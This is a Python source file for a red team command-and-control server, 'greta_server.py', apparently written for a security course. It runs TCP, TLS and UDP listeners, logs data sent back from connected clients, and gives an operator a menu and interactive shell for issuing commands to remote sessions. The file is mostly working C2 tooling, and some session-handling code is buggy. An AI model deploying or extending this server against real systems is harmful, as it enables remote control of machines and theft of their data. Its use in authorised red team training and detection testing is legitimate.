#!/usr/bin/python3

import socket
import threading
import time
import ssl
import argparse
import logging
#from ssl import SSLContext, PROTOCOL_DTLS

#Class wrapper to control and share everything going on
class TCPServer:

    #unpack all the options for the class to start up the various server instances
    def __init__(self, host, tcp_port, tls_port, udp_port, dtls_port, certfile=None, keyfile=None):
        self.host = host
        self.tcp_port= tcp_port
        self.tls_port= tls_port
        self.udp_port = udp_port
        self.dtls_port = dtls_port
        self.certfile = certfile
        self.keyfile = keyfile
        self.udp_socket = None
        self.client_sessions = {}

    #one logging function to simplfy calling
    def logging(self, log, message):

        logger = logging.getLogger(log)
        
        #if hte log handle doesn't exist it creates a new one so each target can have its own log
        if not logger.handlers:

            f_handler = logging.FileHandler(f"./logs/{log}.log")
            f_handler.setLevel(logging.INFO)
            f_format = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            f_handler.setFormatter(f_format)
            logger.addHandler(f_handler)
       
        logger.setLevel(logging.INFO) 
        logger.info(message)

    #Kick off the various servers as threads and starts the main menu
    def start_server(self):
        threading.Thread(target=self.tcp_server).start()
        threading.Thread(target=self.udp_server).start()
        if self.certfile and self.keyfile:
            threading.Thread(target=self.tls_server).start()
#            threading.Thread(target=self.dtls_server).start()

        threading.Thread(target=self.menu).start()

    #Generic TCP server, handling is passed off to a separate function
    def tcp_server(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.tcp_port))
            server_socket.listen(10)
            print(f"TCP server listening on {self.host}:{self.tcp_port}...")
            self.logging("server", f"TCP server listening on {self.host}:{self.tcp_port}")
            self.handle_connections(server_socket, "tcp")

    #TLS server using user provided certificate and key, handling is passed off to the same function as the TCP server
    def tls_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            with context.wrap_socket(server_socket, server_side=True) as tls_socket:
                tls_socket.bind((self.host, self.tls_port))
                tls_socket.listen(10)
                print(f"TLS Server Listening on {self.host}:{self.tls_port}")
                self.logging("server", f"TLS server listening on {self.host}:{self.tls_port}")
                self.handle_connections(tls_socket, "tls")

    #UDP server, passes hanlding to it's own fucntion it would share with DTLS if it was working
    def udp_server(self):
            self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.udp_socket.bind((self.host, self.udp_port))
            print(f"UDP Server Listening on port {self.host}:{self.udp_port}")
            self.logging("server", f"UDP server listening on {self.host}:{self.udp_port}")
            self.handle_udp_connections(self.udp_socket, "udp")

    #DTLS server, support for this isn't the greatest, working on implementation
#    def dtls_server(self):
        
#        sock = socket.socket(socket.AF_INET, socket.sock_DGRAM)
#        sock.bind((self.host, self.dtls_port))

#        context = SSLContext(PROTOCOL_DTLS)
#        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

#        while True:
#           data, addr = sock.recvfrom(65535)
#            bio_in = ssl.MemoryBIO()
#            bio_out = ssl.MemoryBIO()

#            bio_in.write(data)

#            dtls_sock = context.wrap_bio(bio_in, bio_out, server_side=True)

#            try:
#                dtls_sock.do_handshake()
#            except ssl.SSLWantReaderror:
#                pass

#            try:
#                recieved_data = dtls_sock.read()
#                print(f"Recieved data from {addr}: {recieved_data.decode()}")
#                dtls_sock.write(f"Echo: {recieved_data.decode()}".encode())

#                response = bio_out.read()
#                if response:
#                    sock.sendto(response, addr)
#            except ssl.SSLWantReadError:
#                pass
        
#        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
#            with context.wrap_socket(server_socket, server_side=True) as dtls_socket:
#               dtls_socket.bind((self.host, self.dtls_port))
#                print(f"DTLS Server Listening on {self.host}:{self.dtls_port}")
#                self.logging("server", f"DTLS server listening on {self.host}:{self.dtls_port}")
#                self.handle_udp_connections(dtls_socket, "dtls")

    #function to handle incoming UDP traffic and create a session key for tracking 
    def handle_udp_connections(self, server_socket, protocol):

        try:
            while True:
                data, addr = server_socket.recvfrom(1024)
                client_id = (f"{addr[0]}:{addr[1]}", protocol)
                if client_id not in self.client_sessions:
                    self.client_sessions[client_id] = client_id

                print(f"Recieved from {client_id[0]}: {data.decode()}")
                self.logging(client_id[0], data.decode())
            
        except:
            self.logging("server", "UDP Socket Error")

    #function for handling TCP and TLS sockets and creating a session key for tracking, creates a new thread for each TCP/TLS session
    def handle_connections(self, server_socket, protocol):
        try:
            while True:
                client_socket, addr = server_socket.accept()
                client_id = (f"{addr[0]}:{addr[1]}", protocol)
                self.client_sessions[client_id] = client_socket
                print(f"New Connection from {client_id[0]}")
                self.logging("server", f"New connection from {client_id[0]}")
                threading.Thread(target=self.handle_client, args=(client_socket, client_id)).start()

        except KeyboardInterrupt:
            print("Server is shutting down.")
            self.logging("server", "Shutting Down Server")
        
        finally:
            server_socket.close()
            self.logging("server", "Server Socket Closed")

    #function for handling each TCP session in terms of displaying and logging data
    def handle_client(self,client_socket, client_id):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print(f"Revieved from {client_id[0]}: {data.decode()}")
                self.logging(client_id[0], data.decode())

        finally:
            client_socket.close()
            del self.client_sessions[client_id[0]]
            print(f"Connection with {client_id} closed.")
            self.logging("server", f"Connection with {client_id} closed")
            self.logging(client_id[0], "Connection Closed")            
    
    #interactive type shell fucntion, keeps going until control word is seen
    def interactive_session_shell(self, session):
        print(f"Now interacting with {session[0]} escape with bAcK")
        
        while True:
        
            command = input(":>")
            if command =='bAcK':
                print("Escape character detected, breaking session!")
                break
            else:
                command = command + '\n'

                if session[1] == 'tcp' or session[1] == 'tls':
                    self.client_sessions[session].send(command.encode())
                    self.logging(session[0], command)
                if session[1] == 'udp':
                    ip, port_str = session[0].split(':')
                    port = int(port_str)
                    try:
                        self.udp_socket.sendto(command.encode(), (ip,port))
                    except:
                        print("Error sending UDP traffic, breaking")
                        break
                time.sleep(1)

    #this is where the user will do the most interaction, will need to be improved in future iterations            
    def menu(self):
        while True:
            print("\nAvaliable Commands:")
            print("1. List Active Sessions")
            print("2. Send command to a session")
            print("3. Interactive Session Shell")
            print("4. Terminate Session")
            print("5. Exit")
            choice = input("Enter your choice: ")
            if choice == '1':
                for session in self.client_sessions:
                    print(session)
            elif choice == '2':
                session_id = input("Enter session ID: ")
                for session in self.client_sessions:
                    if session[0] == session_id:
                        
                        command = input("Enter command to send: ")
                        command = command + "\n"        
                        
                        if session[1] == "tcp" or session[1] == "tls":
                            self.client_sessions[session].send(command.encode())

                        if session[1] == "udp":
                            ip, port_str = session[0].split(':')
                            port = int(port_str)

                            try:
                                self.udp_socket.sendto(command.encode(), (ip,port))
                            except:
                                print("Error Sending Command")

                        self.logging(session[0], command)
                        break

                    print("Session not found.")
            
            elif choice == '3':
                session_id = input("Enter session ID: ")
                for session in self.client_sessions:
                    if session[0] == session_id:
                        self.logging(session_id, "Starting Interactive Session")
                        self.interactive_session_shell(session)
                        break
                    print("Session not found")
            
            elif choice == '4':
                session_id = input("Enter session ID: ")
                for session in self.client_sessions:
                    if session[0] == session_id:
                        session.close()
                        del session
                        self.logging("server", f"Session terminated for {session_id}")
                        self.logging(session_id, "Session Terminated")
            
            elif choice == '5':
                quit()
            time.sleep(1)
            
if __name__ == "__main__":

    print("   / \__")
    print("  (    @\___")
    print("  /         O ")
    print(" /   (_____/")
    print("/_____/ U")
    print('                               ___               ')
    print('                              (   )              ')
    print('  .--.    ___ .-.      .--.    | |_       .---.  ')
    print(' /    \  (   )   \    /    \  (   __)    / .-, \ ')
    print(";  ,-. '  | ' .-. ;  |  .-. ;  | |      (__) ; | ")
    print("| |  | |  |  / (___) |  | | |  | | ___    .'`  | ")
    print("| |  | |  | |        |  |/  |  | |(   )  / .'| | ")
    print("| |  | |  | |        |  ' _.'  | | | |  | /  | | ")
    print("| '  | |  | |        |  .'.-.  | ' | |  ; |  ; | ")
    print("'  `-' |  | |        '  `-' /  ' `-' ;  ' `-'  | ")
    print(" `.__. | (___)        `.__.'    `.__.   `.__.'_. ")
    print(" ( `-' ;                                         ")
    print("  `.__.                                          ")

    parser = argparse.ArgumentParser(prog="greta_server.py version 1.0", description='Red team script to allow multiple forms of C2 for testing the ability of defenders to detect various xfil techniques, written by ac0mm, Andrew Morrow as part of CSC842', epilog="All your logs are belong to us")
    parser.add_argument('-t', '--tcp_port', type=int, help='Set port for TCP socket', required=False, default=50000)
    parser.add_argument('-s', '--tls_port', type=int, help='Set port for TLS socket', required=False, default=50001)
    parser.add_argument('-d', '--dtls_port', type=int, help='Set port for TDLS socket', required=False, default=50002)
    parser.add_argument('-u', '--udp_port', type=int, help="Set port for UDP socket", required=False, default=50003)
    parser.add_argument('-i', '--host', type=str, help="Set the host for ports to bind to", required=False, default="0.0.0.0")
    parser.add_argument('-c', '--cert', type=str, help="Set the TLS certificate file", required=True)
    parser.add_argument('-k', '--key', type=str, help='Set the Key file for TLS certificate', required=True)
    
    parser_args = parser.parse_args()

    host = parser_args.host
    tcp_port = parser_args.tcp_port
    tls_port = parser_args.tls_port
    dtls_port = parser_args.dtls_port
    udp_port = parser_args.udp_port
    certfile = parser_args.cert
    keyfile = parser_args.key

    server = TCPServer(host, tcp_port, tls_port, udp_port, dtls_port, certfile, keyfile)
    server.start_server()